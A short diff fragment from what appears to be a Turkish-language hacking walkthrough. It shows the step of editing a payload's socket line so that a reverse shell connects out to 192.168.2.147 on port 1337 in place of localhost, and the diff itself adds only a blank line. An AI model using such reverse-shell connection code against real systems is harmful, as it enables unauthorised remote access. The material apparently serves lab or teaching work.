@@ -330,6 +330,7 @@ ama artık bu payload'un bize reverse shell üreteceğine inandığımız ve sal
 O yüzden 
 
     s.connect(("localhost",1337))
+    
 olan satırı 
 
     s.connect(("192.168.2.147",1337))
